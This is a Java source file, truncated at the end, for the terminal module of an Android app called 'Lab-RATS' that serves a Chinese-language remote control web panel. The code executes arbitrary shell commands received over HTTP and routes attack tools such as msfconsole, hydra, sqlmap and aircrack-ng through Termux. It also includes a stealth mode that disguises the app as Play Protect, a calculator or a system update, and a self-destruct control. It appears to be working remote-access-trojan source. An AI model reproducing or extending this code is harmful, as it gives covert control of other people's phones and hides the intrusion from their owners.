package com.labs.labrats.modules;

import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;

import com.labs.labrats.Constants;
import com.labs.labrats.FirebaseConfig;
import com.labs.labrats.LabRatsWorker;
import com.labs.labrats.MainActivity;
import com.labs.labrats.StatusNotification;
import com.labs.labrats.SystemAnalytics;
import com.labs.labrats.WorkManager_Sync;

import java.io.File;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;

import fi.iki.elonen.NanoHTTPD.IHTTPSession;
import fi.iki.elonen.NanoHTTPD.Response;

public class TerminalModule extends BaseModule {

    private static String currentShellPath = "/sdcard";
    private static boolean isKaliSession = false;

    public TerminalModule(Context context, FirebaseConfig server) {
        super(context, server);
    }

    public Response handleRequest(IHTTPSession session) {
        String uri = session.getUri();
        Map<String, String> params = session.getParms();

        if (uri.equals("/") || uri.equals("/terminal") || uri.isEmpty()) {
            return serveHome(session);
        } else if (uri.equals("/terminal/restart")) {
            return restartServer();
        } else if (uri.equals("/terminal/clear-logs")) {
            return clearLogs();
        } else if (uri.equals("/terminal/logs")) {
            return serveLogs(params);
        } else if (uri.equals("/device/shell")) {
            return handleShell(params);
        }
        return null;
    }

    private Response serveHome(IHTTPSession session) {
        WorkManager_Sync.notifyOperatorActivity();
        String ip = MainActivity.getLocalIpAddress();
        String ipDisplay = (ip != null ? ip : "未知");
        String sessionId = FirebaseConfig.getSessionId();

        StringBuilder html = new StringBuilder(getHeader(session.getUri()));

        // --- 状态卡片区 ---
        html.append("<div class=\"adm-grid\">");
        String snifferStatus = StatusNotification.isServiceRunning()
                ? "<span style=\"color:#34d399;\">已启用</span>"
                : "<span style=\"color:#f87171;\">未启用</span>";
        html.append("<div class=\"adm-stat\"><div class=\"k\">链路状态</div><div class=\"v\">在线 ").append(snifferStatus).append("</div></div>");
        html.append("<div class=\"adm-stat\"><div class=\"k\">监听端口</div><div class=\"v\">").append(server.getListeningPort()).append("</div></div>");
        html.append("<div class=\"adm-stat\"><div class=\"k\">本机地址</div><div class=\"v\">").append(ipDisplay).append("</div></div>");
        html.append("<div class=\"adm-stat\"><div class=\"k\">会话 ID</div><div class=\"v\">").append(sessionId).append("</div></div>");
        html.append("</div>");

        boolean termuxInstalled = isAppInstalled("com.termux");
        String promptSymbol = termuxInstalled ? "$" : "#";

        // --- 系统日志卡片 ---
        html.append("<div class=\"adm-card\">");
        html.append("<h2>系统日志</h2>");
        html.append("<div id=\"log-terminal\" class=\"terminal-text\" style=\"height:250px; overflow-y:auto; font-size:13px; background:#0c0d0f; border:1px solid #232427; border-radius:8px; padding:12px; color:#c8c8c8;\">");
        html.append("正在加载系统日志…");
        html.append("</div>");
        html.append("<div style=\"margin-top:12px;\"><button onclick=\"clearSessionLogs()\" class=\"adm-btn\" style=\"background:#1a1b1e; color:#e6e6e6; border-color:#2c2d31;\">清空日志</button></div>");
        html.append("</div>");

        // --- 远程终端卡片 ---
        html.append("<div class=\"adm-card\">");
        html.append("<h2>远程终端</h2>");
        html.append("<div style=\"background:#0c0d0f; border:1px solid #232427; border-radius:8px; overflow:hidden;\">");
        html.append("<div id=\"termux-uplink\" style=\"color:#eab308; padding:10px 16px 0 16px; font-size:12px; font-family:monospace; display:").append(termuxInstalled ? "block" : "none").append(";\">[UPLINK] Termux bridge available.</div>");
        html.append("<div id=\"shell-output\" style=\"padding:14px 16px; font-size:13px; color:#9be9a8; line-height:1.6; font-family:monospace; height:250px; overflow-y:auto;\">");
        html.append("<div>[系统] 正在初始化远程会话…</div>");
        html.append("<div>[UPLINK] Active path: ").append(escapeHtml(currentShellPath)).append("</div>");
        html.append("<div style=\"opacity:0.5; margin-top:5px;\">输入 help 查看命令列表</div>");
        html.append("</div>");
        html.append("<div style=\"border-top:1px solid #232427; padding:10px 12px; display:flex; align-items:center;\">");
        html.append("<span id=\"terminal-prompt\" style=\"color:#9be9a8; font-family:monospace; font-size:13px; margin-right:10px; white-space:nowrap;\">root@Android:").append(escapeHtml(currentShellPath)).append(promptSymbol).append("</span>");
        html.append("<input id=\"shell-cmd\" type=\"text\" autocapitalize=\"none\" autocorrect=\"off\" autocomplete=\"off\" spellcheck=\"false\" placeholder=\"输入命令…\" style=\"background:transparent; border:none; color:#e6e6e6; outline:none; font-family:monospace; font-size:13px; flex-grow:1; padding:5px 0;\">");
        html.append("</div>");
        html.append("</div>");
        html.append("<div style=\"margin-top:12px; display:flex; gap:10px; flex-wrap:wrap;\">");
        html.append("<button onclick=\"executeShell()\" class=\"adm-btn\">执行</button>");
        html.append("<button onclick=\"document.getElementById('shell-output').innerHTML=''\" class=\"adm-btn\" style=\"background:#1a1b1e; color:#e6e6e6; border-color:#2c2d31;\">清屏</button>");
        html.append("</div>");
        html.append("</div>");

        // --- 设备命令卡片 ---
        html.append("<div class=\"adm-card\">");
        html.append("<h2>设备命令</h2>");
        html.append("<div style=\"margin-bottom:16px;\">");
        html.append("<div style=\"font-size:12px; color:#8b9096; margin-bottom:8px;\">设备声音设置</div>");
        html.append("<div style=\"display:flex; gap:12px; flex-wrap:wrap;\">");
        html.append("<select id=\"device-cmd-selector\" style=\"background:#0c0d0f; border:1px solid #2c2d31; color:#e6e6e6; padding:9px; border-radius:6px; outline:none; font-size:13px; width:320px;\">");
        html.append("<option value=\"vibrate\">振动设备</option>");
        html.append("<option value=\"max-volume\">最大化音量</option>");
        html.append("<option value=\"silent-mode\">静音模式</option>");
        html.append("</select>");
        html.append("<button onclick=\"deviceCmd(document.getElementById('device-cmd-selector').value)\" class=\"adm-btn\">执行</button>");
        html.append("</div></div>");

        // 打开应用
        html.append("<div style=\"margin-bottom:16px;\">");
        html.append("<div style=\"font-size:12px; color:#8b9096; margin-bottom:8px;\">打开应用</div>");
        html.append("<div style=\"display:flex; gap:12px; flex-wrap:wrap;\">");
        html.append("<select id=\"app-selector\" style=\"background:#0c0d0f; border:1px solid #2c2d31; color:#e6e6e6; padding:9px; border-radius:6px; outline:none; font-size:13px; width:320px;\">");
        html.append("<option value=\"\">选择应用…</option>");
        for (FirebaseConfig.AppEntry app : server.getLaunchableAppsProxy()) {
            html.append("<option value=\"").append(app.packageName).append("\">").append(escapeHtml(app.name)).append("</option>");
        }
        html.append("</select>");
        html.append("<button onclick=\"openApp()\" class=\"adm-btn\">打开</button>");
        html.append("</div></div>");

        // 打开网址
        html.append("<div style=\"margin-bottom:8px;\">");
        html.append("<div style=\"font-size:12px; color:#8b9096; margin-bottom:8px;\">打开网址</div>");
        html.append("<div style=\"display:flex; gap:12px; flex-wrap:wrap;\">");
        html.append("<input id=\"target-url\" type=\"text\" placeholder=\"https://example.com\" style=\"background:#0c0d0f; border:1px solid #2c2d31; color:#e6e6e6; padding:9px; border-radius:6px; outline:none; font-size:13px; width:320px;\">");
        html.append("<button onclick=\"openUrl()\" class=\"adm-btn\">执行</button>");
        html.append("</div></div>");
        html.append("</div>");

        // --- 隐身模式卡片 ---
        html.append("<div class=\"adm-card\">");
        html.append("<h2>隐身模式</h2>");
        html.append("<div style=\"margin-bottom:14px;\">");
        html.append("<label style=\"font-size:12px; color:#8b9096;\">伪装身份:</label>");
        html.append("<select id=\"stealth-type\" style=\"width:100%; max-width:450px; background:#0c0d0f; border:1px solid #2c2d31; color:#e6e6e6; padding:9px; border-radius:6px; outline:none; font-size:13px; margin-top:6px;\">");
        html.append("<option value=\"settings\">Play Protect（安全盾牌）</option>");
        html.append("<option value=\"calc\">计算器</option>");
        html.append("<option value=\"weather\">天气</option>");
        html.append("<option value=\"update\">系统更新</option>");
        html.append("<option value=\"smarttutor\">Smart Tutor（三星远程协助）</option>");
        html.append("<option value=\"logo\">Lab-RATS Logo（未伪装）</option>");
        html.append("</select>");
        html.append("</div>");
        html.append("<div style=\"display:flex; flex-direction:column; gap:10px; align-items:flex-start;\">");
        html.append("<button onclick=\"toggleStealth()\" class=\"adm-btn\">启用隐身</button>");
        html.append("<button onclick=\"restoreNormal()\" class=\"adm-btn\" style=\"background:#1a1b1e; color:#e6e6e6; border-color:#2c2d31;\">恢复正常</button>");
        html.append("</div>");
        html.append("</div>");

        // --- 修改访问密钥 ---
        html.append("<div class=\"adm-card\">");
        html.append("<h2>修改访问密钥</h2>");
        html.append("<form action=\"/settings/password\" method=\"POST\" style=\"display:flex; gap:10px; flex-wrap:wrap;\">");
        html.append("<input name=\"new_password\" type=\"password\" placeholder=\"输入新密钥\" style=\"background:#0c0d0f; border:1px solid #2c2d31; color:#e6e6e6; padding:9px; border-radius:6px; outline:none; font-size:13px; width:320px;\">");
        html.append("<button type=\"submit\" class=\"adm-btn\">更新密钥</button>");
        html.append("</form>");
        html.append("</div>");

        // --- 危险操作 ---
        html.append("<div class=\"adm-card\" style=\"border-color:#3a1d1d;\">");
        html.append("<h2 style=\"color:#f87171;\">危险操作</h2>");
        html.append("<div style=\"display:flex; gap:12px; flex-wrap:wrap;\">");
        html.append("<button onclick=\"deviceCmd('terminate')\" class=\"adm-btn\" style=\"background:#1a1b1e; color:#f87171; border-color:#3a1d1d;\">&#128683; 断开链路</button>");
        html.append("<button onclick=\"restartServer()\" class=\"adm-btn\" style=\"background:#1a1b1e; color:#e6e6e6; border-color:#2c2d31;\">&#128260; 重启服务</button>");
        html.append("<button onclick=\"selfDestruct()\" class=\"adm-btn\" style=\"background:#2a1515; color:#f87171; border-color:#5b2020;\">&#9763; 自我销毁</button>");
        html.append("</div></div>");

        html.append(getFooter());
        return server.serveGzippedProxy(session, "text/html", html.toString());
    }

    private Response restartServer() {
        FirebaseConfig.logActivity("SECURITY_MAINTENANCE: Initiating remote service restart...");
        new Handler(Looper.getMainLooper()).postDelayed(() -> {
            Intent intent = new Intent(context, WorkManager_Sync.class);
            intent.setAction(Constants.ACTION_STOP_CORE);
            context.startService(intent);
        }, 1500);
        return newResponse(Response.Status.OK, "application/json", "{\"success\": true}");
    }

    private Response clearLogs() {
        FirebaseConfig.clearSystemLogs();
        FirebaseConfig.logActivity("SYSTEM_MAINTENANCE: Session logs cleared");
        return newResponse(Response.Status.OK, "application/json", "{\"success\": true}");
    }

    private Response serveLogs(Map<String, String> params) {
        int since = 0;
        try {
            if (params.containsKey("since")) since = Integer.parseInt(params.get("since"));
        } catch (Exception ignored) {}
        
        return newResponse(Response.Status.OK, "application/json", FirebaseConfig.getLogsJson(since));
    }

    private Response handleShell(Map<String, String> params) {
        String cmd = params.get("cmd");
        boolean termuxAvailable = isAppInstalled("com.termux");
        String shellResult = executeShell(cmd);
        
        try {
            org.json.JSONObject resultObj = new org.json.JSONObject();
            resultObj.put("output", shellResult);
            resultObj.put("termux_available", termuxAvailable);
            resultObj.put("current_path", currentShellPath);
            return newResponse(Response.Status.OK, "application/json", resultObj.toString());
        } catch (Exception e) {
            return newResponse(Response.Status.OK, "application/json", "{\"output\": \"JSON Error\", \"termux_available\": false, \"current_path\": \"/sdcard\"}");
        }
    }

    private boolean isAppInstalled(String packageName) {
        try {
            context.getPackageManager().getPackageInfo(packageName, 0);
            return true;
        } catch (Exception e) {
            return false;
        }
    }

    private String executeShell(String command) {
        if (command == null || command.trim().isEmpty()) return "";
        String trimmedCmd = command.trim();

        try {
            if (trimmedCmd.equalsIgnoreCase("clear") || trimmedCmd.equalsIgnoreCase("cls")) {
                return "__CLEAR_SCREEN__";
            }

            if (trimmedCmd.equalsIgnoreCase("exit")) {
                if (isKaliSession) {
                    isKaliSession = false;
                    return "logout\n[Exited Kali NetHunter session]";
                }
                return "exit";
            }

            if (trimmedCmd.equalsIgnoreCase("nh") || trimmedCmd.equalsIgnoreCase("nethunter") || trimmedCmd.equalsIgnoreCase("kali")) {
                isKaliSession = true;
                return "┌──(kali㉿localhost)-[~]\n└─$ [Kali NetHunter chroot session active]";
            }

            if (isKaliSession) {
                String cmdToRun = trimmedCmd;
                if (cmdToRun.equalsIgnoreCase("pkg list-installed") || cmdToRun.equalsIgnoreCase("pkg list")) {
                    cmdToRun = "dpkg -l";
                } else if (cmdToRun.toLowerCase().startsWith("pkg install ")) {
                    cmdToRun = "apt-get install -y " + cmdToRun.substring(12);
                } else if (cmdToRun.toLowerCase().startsWith("pkg update") || cmdToRun.equalsIgnoreCase("apt update")) {
                    cmdToRun = "apt-get update";
                } else if (cmdToRun.toLowerCase().startsWith("pkg upgrade") || cmdToRun.equalsIgnoreCase("apt upgrade")) {
                    cmdToRun = "apt-get upgrade -y";
                }
                trimmedCmd = "nh " + cmdToRun;
            }

            if (trimmedCmd.equalsIgnoreCase("help") || trimmedCmd.equalsIgnoreCase("-h")) {
                return "AVAILABLE_COMMANDS:\n\n" +
                       "  File Operations:\n" +
                       "    cd [path]             - Change directory (e.g. cd /sdcard, cd ..)\n" +
                       "    ls [-la]              - List files in current directory\n" +
                       "    pwd                   - Print current directory path\n" +
                       "    cat [file]            - View file contents\n" +
                       "    cp [src] [dest]       - Copy file or directory\n" +
                       "    mv [src] [dest]       - Move or rename file/directory\n" +
                       "    rm [file]             - Remove file or directory\n" +
                       "    mkdir [dir]           - Create directory\n" +
                       "    touch [file]          - Create empty file\n" +
                       "    find [dir] -name [p]  - Search files by name pattern\n\n" +
                       "  Process & Memory:\n" +
                       "    ps [-A]               - List running processes\n" +
                       "    top -n 1              - Real-time process resource usage\n" +
                       "    free -h               - View RAM / memory usage summary\n" +
                       "    uptime                - System uptime and load average\n\n" +
                       "  System Diagnostics:\n" +
                       "    sysinfo               - Aggregate hardware & software overview\n" +
                       "    getprop [prop]        - View system properties\n" +
                       "    df -h                 - Disk space / partition usage\n" +
                       "    dumpsys battery       - View detailed battery status\n" +
                       "    whoami / id           - Current user identity & UID/GID info\n" +
                       "    uname -a              - Linux kernel version & architecture\n" +
                       "    logcat -d             - Dump recent system logs\n\n" +
                       "  Network & Package Tools:\n" +
                       "    ip addr               - IP & network interface configuration\n" +
                       "    netstat               - Network connections & sockets\n" +
                       "    pm list packages      - List installed application packages\n" +
                       "    pm path [pkg]         - Get APK installation path for package\n" +
                       "    am start -n [comp]    - Launch activity / component\n\n" +
                       "  Termux Bridge:\n" +
                       "    termux [cmd]          - Route command through Termux bridge\n" +
                       "    termux-fix-mirrors    - Fix Termux repository & mirror setup\n\n" +
                       "  Terminal Controls:\n" +
                       "    clear / cls           - Clear terminal screen\n" +
                       "    help / -h             - Show this help menu\n\n" +
                       "CURRENT_PATH: " + currentShellPath;
            }

            if (trimmedCmd.equalsIgnoreCase("ps")) {
                String res = executeShellProcess("ps -A");
                if (res.contains("invalid") || res.contains("not found") || res.trim().isEmpty() || res.contains("[Command executed with no output]")) {
                    res = executeShellProcess("ps");
                }
                return res;
            }

            if (trimmedCmd.equals("free") || trimmedCmd.startsWith("free ")) {
                String res = executeShellProcess(trimmedCmd);
                if (res.contains("not found") || res.contains("Permission denied") || res.trim().isEmpty() || res.contains("[Command executed with no output]")) {
                    return executeShellProcess("cat /proc/meminfo | head -n 12");
                }
                return res;
            }

            if (trimmedCmd.equalsIgnoreCase("sysinfo")) {
                return "SYSTEM_OVERVIEW:\n" +
                       "  Manufacturer: " + android.os.Build.MANUFACTURER + "\n" +
                       "  Model: " + android.os.Build.MODEL + "\n" +
                       "  Android Ver: " + android.os.Build.VERSION.RELEASE + " (API " + android.os.Build.VERSION.SDK_INT + ")\n" +
                       "  Current Path: " + currentShellPath + "\n" +
                       "  Session User: u0_a" + (android.os.Process.myUid() - 10000) + " (UID: " + android.os.Process.myUid() + ")\n" +
                       "  Architecture: " + System.getProperty("os.arch");
            }

            if (trimmedCmd.equalsIgnoreCase("pwd")) {
                return currentShellPath;
            }

            if (trimmedCmd.equalsIgnoreCase("termux-fix-mirrors")) {
                return executeShell("termux mkdir -p /data/data/com.termux/files/usr/etc/apt && echo \"deb https://packages.termux.dev/apt/termux-main stable main\" > /data/data/com.termux/files/usr/etc/apt/sources.list && apt update");
            }

            if (trimmedCmd.startsWith("termux ") || 
               (isAppInstalled("com.termux") && (
                   trimmedCmd.startsWith("pkg ") || trimmedCmd.equals("pkg") ||
                   trimmedCmd.startsWith("apt ") || trimmedCmd.equals("apt") ||
                   trimmedCmd.startsWith("pip ") || trimmedCmd.equals("pip") ||
                   trimmedCmd.startsWith("python ") || trimmedCmd.equals("python") ||
                   trimmedCmd.startsWith("nmap ") || trimmedCmd.equals("nmap") ||
                   trimmedCmd.startsWith("dpkg ") || trimmedCmd.equals("dpkg") ||
                   trimmedCmd.startsWith("nh ") || trimmedCmd.equals("nh") ||
                   trimmedCmd.startsWith("nethunter ") || trimmedCmd.equals("nethunter") ||
                   trimmedCmd.startsWith("kali ") || trimmedCmd.equals("kali") ||
                   trimmedCmd.startsWith("msfconsole") ||
                   trimmedCmd.startsWith("sqlmap") ||
                   trimmedCmd.startsWith("hydra") ||
                   trimmedCmd.startsWith("wifite") ||
                   trimmedCmd.startsWith("aircrack-ng")
               ))) {
                
                if (!isAppInstalled("com.termux")) return "Error: Termux is not installed on this device.";
                
                String termuxCmd = trimmedCmd;
                if (trimmedCmd.startsWith("termux ")) termuxCmd = trimmedCmd.substring(7).trim();
                termuxCmd = resolveTermuxPath(termuxCmd);

                String cmdId = String.valueOf(System.currentTimeMillis() % 1000000);
                File downloadDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
                File outputFile = new File(downloadDir, "termux_" + cmdId + ".txt");

                Intent intent = new Intent("com.termux.RUN_COMMAND");
                intent.setClassName("com.termux", "com.termux.app.RunCommandService");
                intent.putExtra("com.termux.RUN_COMMAND_PATH", "/data/data/com.termux/files/usr/bin/bash");
                
                String workDir = new File("/home/kali").exists() ? "/home/kali" : "/data/data/com.termux/files/home";
                String wrappedCmd = "export PATH=/data/data/com.termux/files/usr/bin:$PATH; " +
                                  "export HOME=" + workDir + "; " +
                                  "cd " + workDir + "; " +
                                  "export DEBIAN_FRONTEND=noninteractive; " +
                                  "({ " + termuxCmd + "; }) > " + outputFile.getAbsolutePath() + " 2>&1; " +
                                  "echo \"\n__DONE_" + cmdId + "__\" >> " + outputFile.getAbsolutePath();
                
                intent.putExtra("com.termux.RUN_COMMAND_ARGUMENTS", new String[]{"-c", wrappedCmd});
                intent.putExtra("com.termux.RUN_COMMAND_WORKDIR", workDir);
                intent.putExtra("com.termux.RUN_COMMAND_BACKGROUND", true);
                intent.addFlags(Intent.FLAG_RECEIVER_FOREGROUND);
                
                try {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        try {
                            context.startForegroundService(intent);
                        } catch (Exception fgEx) {
                            context.startService(intent);
                        }
                    } else {
                        context.startService(intent);
                    }
                } catch (Exception e) {
                    return executeTermuxDirectFallback(termuxCmd);
                }

                final String checkCmd = trimmedCmd;
                final java.util.concurrent.CountDownLatch latch = new java.util.concurrent.CountDownLatch(1);
                String marker = "__DONE_" + cmdId + "__";
                
                LabRatsWorker.execute(() -> {
                    int retries = 0;
                    int maxRetries = (checkCmd.contains("pkg") || checkCmd.contains("apt") || checkCmd.contains("pip")) ? 300 : 60; 
                    while (retries < maxRetries) {
                        try { Thread.sleep(1000); } catch (Exception ignored) {}
                        if (outputFile.exists() && outputFile.length() > 0) {
                            try (java.io.RandomAccessFile raf = new java.io.RandomAccessFile(outputFile, "r")) {
                                long len = raf.length();
                                if (len > 30) {
                                    raf.seek(len - 30);
                                    byte[] endBytes = new byte[30];
                                    raf.read(endBytes);
                                    if (new String(endBytes).contains(marker)) {
                                        latch.countDown();
                                        return;
                                    }
                                }
                            } catch (Exception ignored) {}
                        }
                        retries++;
                    }
                    latch.countDown();
                });

                try {
                    latch.await();
                } catch (InterruptedException ignored) {}

                if (outputFile.exists() && outputFile.length() > 0) {
                    try { Thread.sleep(500); } catch (Exception ignored) {}
                    
                    for (int r = 0; r < 5; r++) {
                        try {
                            java.io.ByteArrayOutputStream baos = new java.io.ByteArrayOutputStream();
                            try (java.io.FileInputStream fis = new java.io.FileInputStream(outputFile)) {
                                byte[] buffer_chunk = new byte[8192];
                                int len_read;
                                while ((len_read = fis.read(buffer_chunk)) != -1) {
                                    baos.write(buffer_chunk, 0, len_read);
                                }
                            }
                            
                            String result = baos.toString("UTF-8");
                            if (result.contains(marker)) {
                                result = result.replace(marker, "").trim();
                                try { outputFile.delete(); } catch (Exception ignored) {}
                                return result + "\n\n[Termux Bridge Execution Complete]";
                            }
                            
                            if (r == 4) return result + "\n\n[Warning: Completion marker not detected, output might be partial]";
                        } catch (Exception e) {
                            try { Thread.sleep(1000); } catch (Exception ignored) {}
                        }
                    }
                }
                
                // Fallback to direct process execution if RunCommandService failed or timed out
                return executeTermuxDirectFallback(termuxCmd);
            }

            if (trimmedCmd.startsWith("cd") && (trimmedCmd.length() == 2 || Character.isWhitespace(trimmedCmd.charAt(2)))) {
                String targetPath = trimmedCmd.length() > 2 ? trimmedCmd.substring(2).trim() : "";
                if ((targetPath.startsWith("\"") && targetPath.endsWith("\"")) || (targetPath.startsWith("'") && targetPath.endsWith("'"))) {
                    if (targetPath.length() >= 2) {
                        targetPath = targetPath.substring(1, targetPath.length() - 1).trim();
                    }
                }
                
                File sdcard = Environment.getExternalStorageDirectory();
                String defaultHome = (sdcard != null && sdcard.exists()) ? sdcard.getAbsolutePath() : context.getFilesDir().getAbsolutePath();

                if (targetPath.isEmpty() || targetPath.equals("~")) {
                    targetPath = defaultHome;
                } else if (targetPath.startsWith("~/")) {
                    targetPath = defaultHome + targetPath.substring(1);
                }
                
                File nextDir;
                if (targetPath.startsWith("/")) {
                    nextDir = new File(targetPath);
                } else {
                    nextDir = new File(currentShellPath, targetPath);
                }

                if (nextDir.exists() && nextDir.isDirectory()) {
                    try {
                        currentShellPath = nextDir.getCanonicalPath();
                    } catch (Exception e) {
                        currentShellPath = nextDir.getAbsolutePath();
                    }
                    return "Directory changed to: " + currentShellPath;
                } else {
                    return "Error: Directory does not exist: " + targetPath;
                }
            }

            if (trimmedCmd.equalsIgnoreCase("whoami")) {
                String res = executeShellProcess("whoami");
                if (res.contains("not found") || res.contains("permission denied") || res.contains("Shell Error") || res.trim().isEmpty() || res.contains("[Command executed with no output]")) {
                    return "u0_a" + (android.os.Process.myUid() - 10000) + " (UID: " + android.os.Process.myUid() + ")";
                }
                return res;
            }

            if (trimmedCmd.startsWith("netstat")) {
                String res = executeShellProcess(trimmedCmd);
                if (res.contains("Permission denied") || res.contains("No such file") || res.trim().isEmpty() || res.contains("[Command executed with no output]")) {
                    return getNetworkInterfaceConfig() + "\n\n[Note: Direct socket table (/proc/net/tcp) is restricted by Android 10+ SELinux rules. Interface IP configuration displayed above.]";
                }
                return res;
            }

            if (trimmedCmd.startsWith("ip") || trimmedCmd.startsWith("ifconfig")) {
                String res = executeShellProcess(trimmedCmd);
                if (res.contains("Permission denied") || res.contains("not found") || res.contains("No such file") || res.trim().isEmpty() || res.contains("[Command executed with no output]")) {
                    return getNetworkInterfaceConfig();
                }
                return res;
            }

            String execCmd = trimmedCmd;
            if (trimmedCmd.equals("logcat") || trimmedCmd.startsWith("logcat ")) {
                if (!trimmedCmd.contains("-d")) {
                    execCmd = execCmd + " -d";
                }
                if (!trimmedCmd.contains("-t")) {
                    execCmd = execCmd + " -t 200";
                }
            } else if (trimmedCmd.equals("top") || trimmedCmd.startsWith("top ")) {
                if (!trimmedCmd.contains("-n")) {
                    execCmd = execCmd + " -n 1 -b";
                }
            } else if (trimmedCmd.startsWith("ping ")) {
                if (!trimmedCmd.contains("-c")) {
                    execCmd = execCmd + " -c 4";
                }
            }

            return executeShellProcess(execCmd);
        } catch (Exception e) {
            return "Shell Error: " + e.getMessage();
        }
    }

    private String executeShellProcess(String command) {
        try {
            File workingDir = new File(currentShellPath);
            if (!workingDir.exists() || !workingDir.isDirectory()) {
                File sdcard = Environment.getExternalStorageDirectory();
                if (sdcard != null && sdcard.exists()) {
                    currentShellPath = sdcard.getCanonicalPath();
                } else {
                    currentShellPath = context.getFilesDir().getCanonicalPath();
                }
                workingDir = new File(currentShellPath);
            }

            ProcessBuilder pb = new ProcessBuilder("sh", "-c", command);
            pb.directory(workingDir);
            pb.redirectErrorStream(true);

            Process process = pb.start();

            final StringBuilder output = new StringBuilder();
            final boolean[] truncated = new boolean[]{false};

            Thread readerThread = new Thread(() -> {
                try (java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(process.getInputStream()))) {
                    String line;
                    int count = 0;
                    while ((line = reader.readLine()) != null) {
                        if (count < 500) {
                            output.append(line).append("\n");
                            count++;
                        } else {
                            truncated[0] = true;
                            break;
                        }
                    }
                } catch (Exception ignored) {}
            });
            readerThread.start();

            final boolean[] finished = new boolean[]{false};
            Thread processWaitThread = new Thread(() -> {
                try {
                    process.waitFor();
                    finished[0] = true;
                } catch (InterruptedException ignored) {}
            });
            processWaitThread.start();

            try {
                processWaitThread.join(10000);
            } catch (InterruptedException ignored) {}

            if (!finished[0]) {
                try {
                    process.destroy();
                } catch (Exception ignored) {}
                processWaitThread.interrupt();
                readerThread.interrupt();
                if (output.length() == 0) {
                    output.append("[Command execution timed out after 10 seconds]");
                } else {
                    output.append("\n[Command execution timed out - output truncated]");
                }
            } else {
                try {
                    readerThread.join(1000);
                } catch (InterruptedException ignored) {}
            }

            if (truncated[0]) {
                output.append("\n[Output truncated at 500 lines]");
            }

            String result = output.toString().trim();
            if (result.isEmpty()) {
                return "[Command executed with no output]";
            }

            FirebaseConfig.logActivity("DEVICE_CONTROL: Shell command executed - " + command);
            return result;
        } catch (Exception e) {
            return "Shell Error: " + e.getMessage();
        }
    }

    private String executeTermuxDirectFallback(String command) {
        try {
            File termuxBin = new File("/data/data/com.termux/files/usr/bin/bash");
            String shPath = termuxBin.exists() ? termuxBin.getAbsolutePath() : "sh";
            
            ProcessBuilder pb = new ProcessBuilder(shPath, "-c", command);
            Map<String, String> env = pb.environment();
            String currentPath = env.get("PATH");
            env.put("PATH", "/data/data/com.termux/files/usr/bin:/data/data/com.termux/files/usr/bin/applets" + (currentPath != null ? ":" + currentPath : ""));
            env.put("HOME", "/data/data/com.termux/files/home");
            env.put("PREFIX", "/data/data/com.termux/files/usr");
            env.put("LD_LIBRARY_PATH", "/data/data/com.termux/files/usr/lib");
            env.put("DEBIAN_FRONTEND", "noninteractive");
            
            File homeDir = new File("/data/data/com.termux/files/home");
            if (homeDir.exists()) {
                pb.directory(homeDir);
            }
            
            Process process = pb.start();
            
            java.io.ByteArrayOutputStream baos = new java.io.ByteArrayOutputStream();
            byte[] buffer = new byte[8192];
            int len;
            try (java.io.InputStream is = process.getInputStream()) {
                while ((len = is.read(buffer)) != -1) {
                    baos.write(buffer, 0, len);
                }
            }
            try (java.io.InputStream es = process.getErrorStream()) {
                while ((len = es.read(buffer)) != -1) {
                    baos.write(buffer, 0, len);
                }
            }
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                process.waitFor(30, java.util.concurrent.TimeUnit.SECONDS);
            } else {
                process.waitFor();
            }
            String output = baos.toString("UTF-8").trim();
            if (output.isEmpty()) {
                return "Termux Execution Notice:\n\n" +
                       "If Termux commands time out or fail, ensure:\n" +
                       "  1. Termux has **Storage permission** granted in Android App Settings (to write output files).\n" +
                       "  2. `allow-external-apps = true` is set in `~/.termux/termux.properties` (followed by `termux-reload-settings`).";
            }
            return output + "\n\n[Termux Direct Bridge Execution Complete]";
        } catch (Exception e) {
            return "Termux Bridge Error: " + e.getMessage() + "\n\n" +
                   "Ensure Termux has Storage permission in Android Settings and `allow-external-apps = true` is enabled in `~/.termux/termux.properties`.";
        }
    }

    private String getNetworkInterfaceConfig() {
        StringBuilder sb = new StringBuilder("IP_CONFIGURATION:\n\n");
        try {
            java.util.Enumeration<java.net.NetworkInterface> interfaces = java.net.NetworkInterface.getNetworkInterfaces();
            if (interfaces == null || !interfaces.hasMoreElements()) {
                return "Error: No network interfaces found.";
            }
            while (interfaces.hasMoreElements()) {
                java.net.NetworkInterface netIf = interfaces.nextElement();
                sb.append("  ").append(netIf.getName()).append(": ");
                
                List<String> flags = new ArrayList<>();
                try { if (netIf.isUp()) flags.add("UP"); } catch (Exception ignored) {}
                try { if (netIf.isLoopback()) flags.add("LOOPBACK"); } catch (Exception ignored) {}
                try { if (netIf.isPointToPoint()) flags.add("POINTTOPOINT"); } catch (Exception ignored) {}
                try { if (netIf.supportsMulticast()) flags.add("MULTICAST"); } catch (Exception ignored) {}
                if (!flags.isEmpty()) {
                    sb.append("[").append(android.text.TextUtils.join(", ", flags)).append("]");
                }
                sb.append("\n");

                try {
                    byte[] mac = netIf.getHardwareAddress();
                    if (mac != null && mac.length > 0) {
                        StringBuilder macStr = new StringBuilder();
                        for (int i = 0; i < mac.length; i++) {
                            macStr.append(String.format("%02X%s", mac[i], (i < mac.length - 1) ? ":" : ""));
                        }
                        sb.append("    MAC: ").append(macStr).append("\n");
                    }
                } catch (Exception ignored) {}

                java.util.Enumeration<java.net.InetAddress> addrs = netIf.getInetAddresses();
                while (addrs.hasMoreElements()) {
                    java.net.InetAddress addr = addrs.nextElement();
                    if (addr instanceof java.net.Inet4Address) {
                        sb.append("    IPv4: ").append(addr.getHostAddress()).append("\n");
                    } else if (addr instanceof java.net.Inet6Address) {
                        String host = addr.getHostAddress();
                        if (host != null) {
                            int ip6Idx = host.indexOf('%');
                            if (ip6Idx > 0) host = host.substring(0, ip6Idx);
                            sb.append("    IPv6: ").append(host).append("\n");
                        }
                    }
                }
                sb.append("\n");
            }
            return sb.toString().trim();
        } catch (Exception e) {
            return "Error retrieving network configuration: " + e.getMessage();
        }
    }

    private String resolveTermuxPath(String cmd) {
        if (cmd == null) return "";
        String trimmed = cmd.trim();
        if (trimmed.equals("apt") || trimmed.startsWith("apt ")) {
            return "apt-get" + (trimmed.length() > 3 ? trimmed.substring(3) : "");
